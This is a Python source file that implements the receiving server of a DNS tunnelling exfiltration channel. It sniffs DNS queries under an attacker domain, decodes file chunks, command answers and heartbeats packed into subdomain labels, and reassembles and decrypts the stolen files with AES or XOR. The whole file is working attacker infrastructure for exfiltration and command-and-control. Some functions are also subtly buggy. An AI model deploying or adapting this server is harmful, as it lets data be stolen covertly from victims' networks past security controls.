import os
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR,IP,UDP,DNSRROPT
from scapy.layers.inet6 import IPv6
import logging
from enum import IntEnum
import re
from hashlib import md5,sha1,sha256
from Base36 import Base36
from Crypto import Random
from Crypto.Cipher import AES

class FrameType(IntEnum):
    UNDEFINED=0
    FILE=1
    CMDANSWER=2
    HEARTBEAT=3
    FNAME=4

class TransactionType(IntEnum):
    UNDEFINED=0
    FILE=1
    CMDANSWER=2
    HEARTBEAT=3

class EncryptionType(IntEnum):
    UNDEFINED=0
    AES=1
    XOR=2

class DNSFrame():
    def __init__(self, **kwargs):
        self.reference_size=kwargs.get('reference_size')
        self.requestnum_size=kwargs.get('requestnum_size')
        self.seqnumber=kwargs.get('seqnumber')
        self.reference=kwargs.get('reference')
        self.frame_type=kwargs.get('frame_type')
        self.data=kwargs.get('data')
        self.domain=kwargs.get('domain')
    
    def parse_packet(self,pkt=None):
        #if pkt is not None and pkt.haslayer(DNS):
        if pkt is not None and pkt.haslayer(DNSQR):
            query_name=(pkt.qd.qname).decode("UTF-8")
            re_domain=re.compile(r"\.%s\.?" % self.domain,re.IGNORECASE)
            query_data=re_domain.sub("",query_name)
            # Now, to see what type of frame it is
            pointer=0
            self.reference=query_data[pointer:self.reference_size] # Extract the reference ID of the transaction
            pointer+=self.reference_size
            self.seqnumber=query_data[pointer:pointer+self.requestnum_size] # Extract the sequence number of the transaction
            pointer+=self.requestnum_size
            if (Base36.decode(self.seqnumber) == 0):
                self.frame_type=FrameType(int(query_data[pointer:pointer+1]))
                pointer+=1
            else:
                self.data=query_data[pointer:len(query_data)]
                pointer+=len(query_data)

class DNSMetadataFrame(DNSFrame):
    def __init__(self,**kwargs):
        super().__init__(**kwargs)
        self.length=kwargs.get('length')
        self.compressed=kwargs.get('compressed')
        self.encrypted=kwargs.get('encrypted')
        self.encryption_type=kwargs.get('encryption_type')
        self.sha1=kwargs.get('sha1')
        self.file_name=kwargs.get('file_name')

    """
    The metadata frames have a sequence number of 000000 and contains the following data:
    * REF ID: 5 bytes/chars. This is a random alphanumeric string of 5 chars that identifies the transaction
    * SEQ N#: 6 bytes/chars. This is a base36 number that would allow to reassemble the data in the server side. For the metadata frame it has to be 00000.
    * Type: 1 byte/chars: This is a flag that would tell the type of transaction:
        ** Value 0: Undefined
        ** Value 1: Archive to to exfiltrate (contains the SHA1 at the end of the payload)
        ** Value 2: Response to a command (contains the SHA1 at the end of the payload)
        ** Value 3: Heartbeat
        ** Value 4: File name being sent (if filename is sent, the following placeholders will not be present in the payload)
    * length: 6 bytes/chars. This is a base36 number that would tell the server how many packages are going to be send in this transaction.
    * Compressed: 1 byte/chars. This is a flag that would tell the server if the content is zipped or not.
    * Encrypted: 1 byte/chars. This is a flag that would tell whether the content is encrypted and with wat algorithm:
        ** Value 0: Not encrypted
        ** Value 1: AES
        ** Value 2: XOR
    * [SHA1]: If the type of the frame was not 4 (file name), then we append the SHA1 of the transaction content at the end of the frame
    """
    def parse_packet(self,pkt):
        #if pkt is not None and pkt.haslayer(DNS):
        if pkt is not None and pkt.haslayer(DNSQR):
            super().parse_packet(pkt)
            query_name=(pkt.qd.qname).decode("UTF-8")
            re_domain=re.compile(r"\.%s\.?" % self.domain,re.IGNORECASE)
            query_data=re_domain.sub("",query_name)
            pointer=self.reference_size+self.requestnum_size+1 # position the pointer before continuing with the parsing
            # This is a metadata frame, extract the properties
            if (self.frame_type == FrameType.FNAME):
                # Extract the file name
                name_hex=query_data[pointer:len(query_data)]
                # This can fail when there isn't an even number of characters sent by the client
                # This happens because the decoding of hexadecimal to ASCII will happen from 1 byte to 1 byte, in hex a byte requires two nibbles (\xAB)
                # When we receive a single nibble dangling at the end of the string, the decodification would fail, so we will strip the last character in that case
                if (len(name_hex)%2)!=0:
                    name_hex=name_hex[:len(name_hex)-1]
                self.file_name=bytearray.fromhex(name_hex).decode()
            elif (self.frame_type == FrameType.FILE):
                self.length=Base36.decode(query_data[pointer:pointer+self.requestnum_size])
                pointer+=self.requestnum_size
                self.compressed=bool(query_data[pointer:pointer+1])
                pointer+=1
                enc=int(query_data[pointer:pointer+1])
                pointer+=1
                if (enc == 0):
                    self.encrypted=False
                    self.encryption_type=EncryptionType.UNDEFINED
                else:
                    self.encrypted=True
                    self.encryption_type=EncryptionType(enc)
                # Extract the Hash of the content from the tail of the frame
                # The rest of the query is data of the file being sent
                self.sha1=query_data[pointer:len(query_data)]

            elif (self.frame_type == FrameType.CMDANSWER):
                pass
            elif (self.frame_type == FrameType.HEARTBEAT):
                pass
            elif (self.frame_type == FrameType.UNDEFINED):
                pass

class Transaction():
    def __init__(self, **kwargs):
        self.reference=kwargs.get('reference')
        self.transaction_type=kwargs.get('transaction_type')
        self.length=kwargs.get('length')
        self.compressed=kwargs.get('compressed')
        self.encrypted=kwargs.get('encrypted')
        self.encryption_type=kwargs.get('encryption_type')
        self.sha1=kwargs.get('sha1')
        self.file_name=kwargs.get('file_name')
        self.assembled_content={}
        self.completed=False
        self.decrypted=False
        self.output_path=None
        self.decrypted_output_path=None

    # This function will return true if the data frame is already in the transaction assembled_content array
    def frame_already_assembled(self,dnsframe: DNSFrame):
        if (dnsframe.reference == self.reference):
            return self.assembled_content[dnsframe.seqnumber] is not None
        else:
            return None

    # This function will return true if we have received all the content from the client
    def is_content_complete(self):
        # Count the number of data frames we already have in our assembled_content
        if (len(self.assembled_content) == self.length):
            return True
        else:
            return False

    def get_content(self,sequence_id=None):
        if (sequence_id is None):
            # Sort and reasemble all the content
            sorted_content=[]
            for i in range(0,self.length):
                sorted_content+=self.assembled_content[i]
                return sorted_content
        else:
            return self.assembled_content[sequence_id]

    # This function compares the calculated SHA1 of the assembled_content against the received SHA1 from the client
    def get_outfile_hash(self):
        if (self.output_path is not None):
            BUF_SIZE = 65536  # lets read stuff in 64kb chunks!
            h = sha1()

            with open(self.output_path, 'rb') as f:
                while True:
                    data = f.read(BUF_SIZE)
                    if not data:
                        break
                    h.update(data)
            return h.hexdigest().upper()
        else:
            return None

    def decrypt(self,password=None):
        # Get the bytes of the file to decrypt
        decrypted_content=[]
        with open(self.output_path,"rb") as fr:
            file_content=fr.read()

        if (self.encrypted and password is not None and password.__class__ == str):
            if (self.encryption_type == EncryptionType.AES):
                iv = file_content[:AES.block_size]
                h = sha256()
                h.update(password.encode())
                cipher = AES.new(h.digest(), AES.MODE_CBC, iv)
                decrypted_content=cipher.decrypt(file_content[AES.block_size:])
                self.decrypted_output_path = self.output_path.replace(".aes","")


            elif (self.encryption_type == EncryptionType.XOR):
                counter=0
                for b in file_content:
                    decrypted_content.append(b^ord(password[counter%len(password)]))
                    counter+=1
                self.decrypted_output_path = self.output_path.replace(".xor","")

            with open(self.decrypted_output_path,"wb") as df:
                df.write(bytes(decrypted_content))
            
            return self.decrypted_output_path
        else:
            return None

    def assemble_content(self,output_folder):
        # Check the size of this transaction and compare to what we already have in the assembled_content array
        nbytes=0
        for seqnum,content in self.assembled_content.items():
            nbytes+=len(content)
        
        # If we have received all the bytes of the transaction
        if (self.length is not None and nbytes>=self.length):
            # Construct the file
            if (not os.path.exists(output_folder)):
                os.mkdir(output_folder)
            file_path=None
            if self.file_name is not None:
                file_path=output_folder+"/"+self.file_name
            else:
                file_path=output_folder+"/"+self.reference
                if (self.compressed):
                    file_path+=".zip"
            
            # Iterate through the content and asemble it in order of the Base36 key
            all_content=""
            for key in sorted(self.assembled_content, key=Base36.decode):
                all_content+=self.assembled_content[key]
            decoded_content=bytearray.fromhex(all_content) # .decode()
            with open(file_path,"wb") as f:
                f.write(decoded_content)
                self.output_path=file_path
            # The file data has been assembled and the file is now closed
            return True
        else:
            return False
            

class DNSServer():
    def __init__(self,**kwargs):
        self.domain=kwargs.get('domain')
        self.port=kwargs.get('port')
        self.interface=kwargs.get('interface')
        self.source=kwargs.get('source')
        self.loglevel=self.__translateloglevel(kwargs.get('loglevel'))
        self.scapy_verbose=0
        if self.loglevel == logging.DEBUG:
            self.scapy_verbose=1
        self.pcap=kwargs.get('pcap')
        self.logfile=kwargs.get('logfile')
        self.reference_size=kwargs.get('reference_size')
        self.requestnum_size=kwargs.get('requestnum_size')
        self.encryption=kwargs.get('encryption')
        self.password=kwargs.get('password')
        self.output_folder=kwargs.get('output_folder')
        self.transactions={} 
        self.sniffer=None
        self.__analysed_queries=[]
        self.logger=None
        # Initialize the logging 
        self.__initiate_logging()

    def __translateloglevel(self, loglevel: str):
        """
        Translate log level from string to logging module constant.
        """
        levels = {
            "CRITICAL": logging.CRITICAL,
            "ERROR": logging.ERROR,
            "WARNING": logging.WARNING,
            "INFO": logging.INFO,
            "DEBUG": logging.DEBUG,
            "NOTSET": logging.NOTSET,
        }
        return levels.get(loglevel.upper(), logging.INFO)
    
    def __initiate_logging(self, logfile: str = None):
        """
        Initialize logging to output messages to both a file and the terminal.

        :param loglevel: Logging level (e.g., 'DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL').
        :param logfile: Path to the log file.
        """
        # Set default values if parameters are not provided
        self.logfile = logfile or "logs/default.log"

        # Create a logger
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(self.loglevel)
        self.logger.handlers.clear()  # Avoid adding duplicate handlers

        # Log formatting
        log_formatter = logging.Formatter(
            "%(asctime)s [%(threadName)-12.12s] [%(levelname)-5.5s] %(message)s"
        )

        # File handler
        file_handler = logging.FileHandler(self.logfile)
        file_handler.setFormatter(log_formatter)
        self.logger.addHandler(file_handler)

        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(log_formatter)
        self.logger.addHandler(console_handler)

    # To save time, this function will return true if the query has already been analysed
    def already_analysed(self,query_name):
        h=md5()
        h.update(query_name.encode("UTF-8"))
        query_hash=h.digest()
        return query_hash in self.__analysed_queries

    def parse_query(self,pkt):
        dnsframe=None
        #if pkt.haslayer(DNS):
        if pkt.haslayer(DNSQR):
            query_name=(pkt.qd.qname).decode("UTF-8")
            if (pkt.haslayer(IP)):
                self.logger.debug("%s < %s - %s" % (pkt[IP].dst,pkt[IP].src,query_name))
            if (pkt.haslayer(IPv6)):
                self.logger.debug("%s < %s - %s" % (pkt[IPv6].dst,pkt[IPv6].src,query_name))
            # Check if the question contains the whitelisted domain name
            if (query_name.endswith(self.domain) or query_name.endswith(self.domain+".")):
                # Answer the query to prevent the client from sending more requests and clog the network
                self.answer_dummy(pkt)
                if (pkt.haslayer(IP)):
                    self.logger.debug("%s > %s - Answering question '%s'" % (pkt[IP].dst,pkt[IP].src,query_name))
                if (pkt.haslayer(IPv6)):
                    self.logger.debug("%s > %s - Answering question '%s'" % (pkt[IPv6].dst,pkt[IPv6].src,query_name))
                # Delete the domain part from the query name
                re_domain=re.compile(r"\.%s\.?" % self.domain,re.IGNORECASE)
                query_name=re_domain.sub("",query_name)
                # To save time, check if this query has already been analysed previously
                if (not self.already_analysed(query_name)):
                    # Now, to see what type of frame it is
                    pointer=0
                    ref=query_name[pointer:self.reference_size] # Extract the reference ID of the transaction
                    pointer+=self.reference_size
                    seq=query_name[pointer:pointer+self.requestnum_size] # Extract the sequence number of the transaction
                    pointer+=self.requestnum_size
                    # if the sequence number is not 0, then is going to be data
                    # therefore, we can consider data from here onwards
                    # This is a metadata frame, extract the properties
                    if (Base36.decode(seq) == 0):
                        frame_type=FrameType(int(query_name[pointer:pointer+1]))
                        pointer+=1
                        # Create the metadata frame
                        dnsframe=DNSMetadataFrame(domain=self.domain,reference_size=self.reference_size,requestnum_size=self.requestnum_size)
                        # Parse the data of the frame
                        dnsframe.parse_packet(pkt)
                        self.logger.info("Metadata packet received [ref-seq-frame type]: %s-%s-%s" % (ref,seq,frame_type))
                    else:
                        dnsframe=DNSFrame(domain=self.domain,reference_size=self.reference_size,requestnum_size=self.requestnum_size)
                        # Parse the data of the frame
                        dnsframe.parse_packet(pkt)
                        self.logger.info("Data frame received [ref-seq-data]: %s-%s-%s" % (ref,seq,dnsframe.data))
                    
                    if (Base36.decode(dnsframe.seqnumber) == 0):
                        if (dnsframe.frame_type == FrameType.FNAME):
                            self.logger.info("[%s]: Received metadata frame containing the file name being transferred" % (dnsframe.reference))
                            self.logger.info("[%s]: %s" % (dnsframe.reference,dnsframe.file_name))
                        elif (dnsframe.frame_type == FrameType.FILE):
                            self.logger.info("[%s]: Received metadata frame with HASH" % (dnsframe.reference))
                            self.logger.info("[%s]: SHA1: %s" % (dnsframe.reference,dnsframe.sha1))
                        elif (dnsframe.frame_type == FrameType.CMDANSWER):
                            self.logger.info("[%s]: Received CMD response with HASH" % (dnsframe.reference))
                            self.logger.info("[%s]: SHA1: %s" % (dnsframe.reference,dnsframe.sha1))
                        elif (dnsframe.frame_type == FrameType.HEARTBEAT):
                            self.logger.info("[%s]: Received Heartbeat from the client" % (dnsframe.reference))
                        elif (dnsframe.frame_type == FrameType.UNDEFINED):
                            self.logger.info("[%s]: Received undefined frame from the client" % (dnsframe.reference))
                    else:
                        self.logger.info("[%s]: Data frame received" % (dnsframe.reference))
                    
                    # Create or update the transactions in the queue of transactions
                    # Check if we have already this transaction ID in the array of open transactions
                    if dnsframe.reference not in self.transactions.keys():
                        # Create a new open transaction in the queue
                        trs=Transaction()
                        if (dnsframe.__class__ == DNSMetadataFrame):
                            trs.file_name=dnsframe.file_name
                            trs.reference=dnsframe.reference
                            trs.length=dnsframe.length
                            trs.compressed=dnsframe.compressed
                            trs.encrypted=dnsframe.encrypted
                            trs.encryption_type=dnsframe.encryption_type
                            trs.sha1=dnsframe.sha1
                            # Set the transaction type to the same as the frame type
                            # unless it is a metadata frame sending the file name
                            if (dnsframe.frame_type != FrameType.FNAME):
                                trs.transaction_type=TransactionType(int(dnsframe.frame_type))
                        elif (dnsframe.__class__ == DNSFrame):
                            trs.assembled_content[dnsframe.seqnumber]=dnsframe.data

                        self.transactions[dnsframe.reference]=trs
                    else:
                        # Update the transaction data if it was already existent in the open transactions
                        trs=self.transactions[dnsframe.reference]
                        if (not trs.completed):
                            if (dnsframe.__class__ == DNSMetadataFrame):
                                # Update data in the transaction array if it is not already populated by a previous metadata frame
                                if (trs.file_name is None and dnsframe.file_name is not None):
                                    trs.file_name=dnsframe.file_name
                                if (trs.reference is None and dnsframe.reference is not None):
                                    trs.reference=dnsframe.reference
                                if (trs.length is None and dnsframe.length is not None):
                                    trs.length=dnsframe.length
                                if (trs.compressed is None and dnsframe.compressed is not None):
                                    trs.compressed=dnsframe.compressed
                                if (trs.encrypted is None and dnsframe.encrypted is not None):
                                    trs.encrypted=dnsframe.encrypted
                                if (trs.encryption_type is None and dnsframe.encryption_type is not None):
                                    trs.encryption_type=dnsframe.encryption_type
                                if (trs.sha1 is None and dnsframe.sha1 is not None):
                                    trs.sha1=dnsframe.sha1
                                # Set the transaction type to the same as the frame type
                                # unless it is a metadata frame sending the file name
                                if (trs.transaction_type is None and dnsframe.frame_type is not None):
                                    if (dnsframe.frame_type != FrameType.FNAME):
                                        trs.transaction_type=TransactionType(int(dnsframe.frame_type))
                            elif (dnsframe.__class__ == DNSFrame):
                                trs.assembled_content[dnsframe.seqnumber]=dnsframe.data
                        else:
                            self.logger.debug("Ignoring this frame. This transaction was already completed.")
                    # Append this query to the list of analysed queries
                    h=md5()
                    h.update(query_name.encode("UTF-8"))
                    query_hash=h.digest()
                    if (query_hash not in self.__analysed_queries):
                        self.__analysed_queries.append(query_hash)
                    
                    # Rebuild all the files that we might have already completely received
                    self.build_completed_transactions(decrypt=True)

                else:
                    self.logger.debug("Ignoring this packet. It has already been observed")
            else:
                self.logger.debug("Ignoring this packet. Domain name '%s' is not found on the query (%s)" % (self.domain,query_name))
        else:
            self.logger.debug("Ignoring this packet. It is not a DNS request.")

    # This function will reconstruct the files from the transactions array
    # If a transaction is completed, it will mark the array of the transaction as completed and will free the data received
    def build_completed_transactions(self,decrypt=True):
        for reference,transaction in self.transactions.items():
            if not transaction.completed:
                if (transaction.assemble_content(output_folder=self.output_folder)):
                    transaction.completed=True
                    calculated_sha1=transaction.get_outfile_hash()
                    if (calculated_sha1 == transaction.sha1):
                        self.logger.info("[%s] Transaction completed and saved to disk in %s. Hash matched" % (transaction.reference,transaction.output_path))
                    else:
                        self.logger.warning("[%s] Transaction completed and saved to disk in %s, but the hash didn't match (%s!=%s)" % (transaction.reference,transaction.output_path,calculated_sha1,transaction.sha1))
                    # Decrypt the files if they are encrypted
                    if (transaction.encrypted and decrypt):
                        transaction.decrypt(password=self.password)
                        if (transaction.decrypted_output_path is not None):
                            if (transaction.encryption_type == EncryptionType.XOR):
                                self.logger.debug("[%s] XOR Decrypted file in %s" % (transaction.reference,transaction.decrypted_output_path))
                            elif (transaction.encryption_type == EncryptionType.AES):
                                self.logger.debug("[%s] AES Decrypted file in %s" % (transaction.reference,transaction.decrypted_output_path))
                        else:
                            self.logger.warning("[%s] There was an error decyrpting the file. Skiping decryption for this one." % transaction.reference)

                else:
                    self.logger.debug("[%s] We haven't received all the data of this transaction. Waiting for more data." % transaction.reference)
            else:
                self.logger.debug("[%s] This transaction is already completed and data has been saved to disk." % transaction.reference)

    # This function will answer all the requests coming from the client side
    # Answering queries is useful when you don't want the client's network to be overflowed with DNS requests repeated
    # several times (~x10) because the client hasn't received any answer from the server
    def answer_dummy(self,pkt):
        dns_req=pkt

        query_name=dns_req[DNSQR].qname
        src_port=dns_req[UDP].sport
        dst_port=dns_req[UDP].dport
        req_id=dns_req[DNS].id
        
        dnsrropt=None
        if (dns_req.haslayer(DNSRROPT)):
            dnsrropt=dns_req[DNSRROPT]

        response_data=None
        if dns_req.qd.qtype == 28: # AAAA is the enum 28
            response_data="::1"
        else:
            response_data="127.0.0.1"

        dnsip=None
        if dns_req.haslayer(IPv6):
            src_ip=dns_req[IPv6].src
            dnsrr=DNSRR(rrname=dns_req.qd.qname,type=dns_req.qd.qtype,rclass=dns_req.qd.qclass,rdata=response_data)
            dnsip=IPv6(dst=src_ip)
        else:
            src_ip=dns_req[IP].src
            dnsrr=DNSRR(rrname=dns_req.qd.qname,type=dns_req.qd.qtype,rclass=dns_req.qd.qclass,rdata=response_data)
            dnsip=IP(dst=src_ip)
        
        dnsudp=UDP(dport=src_port,sport=dst_port)
        dnsdns=DNS(rd=1,qr=1,ra=1,id=req_id,qd=dns_req[DNSQR],an=dnsrr,ar=dnsrropt)

        dns_res= dnsip/dnsudp/dnsdns
        send(dns_res, verbose=self.scapy_verbose) # , iface=self.interface)

    def __build_filter(self):
        filter=None
        if self.port is not None:
            filter = "port %s" % self.port
        if self.interface is not None:
            filter += " and dst host %s" % ifaces.get(self.interface).ip
        if self.source is not None:
            filter += "and src host %s" % self.source
        return filter
                
    # This function will start Scapy sniffer in an async thread
    def start(self,filter=None):
        f=None
        if (filter is not None):
            f=filter
        else:
            f=self.__build_filter()
        self.logger.info("Start sniffing the network with the filter: %s" % f) 

        # If we are reading packets from a file:
        if self.pcap is not None and os.path.exists(self.pcap):
            self.logger.info("Start sniffing from file '%s' with the filter: %s" % (self.pcap,f))
            if f is not None: 
                #self.sniffer=AsyncSniffer(offline=self.pcap,filter=f,store=False,prn=self.parse_query)
                self.sniffer=sniff(offline=self.pcap,filter=f,store=False,prn=self.parse_query,iface=self.interface)
            else:
                #self.sniffer=AsyncSniffer(offline=self.pcap,store=False,prn=self.parse_query)
                self.sniffer=sniff(offline=self.pcap,store=False,prn=self.parse_query,iface=self.interface)

        # If we are reading packets form an interface
        else:   
            self.logger.info("Start sniffing the network with the filter: %s" % f)  
            if f is not None:
                #self.sniffer=AsyncSniffer(filter=f,store=False,prn=self.parse_query)
                self.sniffer=sniff(filter=f,store=False,prn=self.parse_query,iface=self.interface)
            else:
                #self.sniffer=AsyncSniffer(store=False,prn=self.parse_query)
                self.sniffer=sniff(store=False,prn=self.parse_query,iface=self.interface)
        
        return True

    # Log with the specifie log level
    def log(self,message=None,level=None):
        if level is None:
            self.logger.info(message)
        else:
            self.logger.log(level=level,msg=message)

    def stop(self):
        self.sniffer.stop()

   
